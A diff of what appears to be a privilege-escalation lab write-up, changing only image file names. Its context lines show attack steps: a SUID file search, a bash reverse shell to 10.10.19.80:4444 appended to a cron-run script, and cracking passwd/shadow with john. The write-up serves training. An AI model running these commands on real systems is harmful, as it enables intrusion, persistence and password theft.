@@ -139,7 +139,7 @@ find / -type f -perm -04000 -ls 2>/dev/null
 cat /etc/passwd
 ```
 
-<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (8).png" alt=""><figcaption></figcaption></figure>
 
 **What is the password of user2?**
 
@@ -221,7 +221,7 @@ cat /home/ubuntu/flag4.txt
 cat /etc/crontab
 ```
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (10).png" alt=""><figcaption></figcaption></figure>
 
 **Victim**
 
@@ -245,7 +245,7 @@ chmod +x /home/karen/backup.sh
 echo "bash -i >& /dev/tcp/10.10.19.80/4444 0>&1" >> /home/karen/backup.sh
 ```
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (11).png" alt=""><figcaption></figcaption></figure>
 
 **What is Matt's password?**
 
@@ -361,7 +361,7 @@ unshadow passwd shadow > passwords.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 **Victim**
 
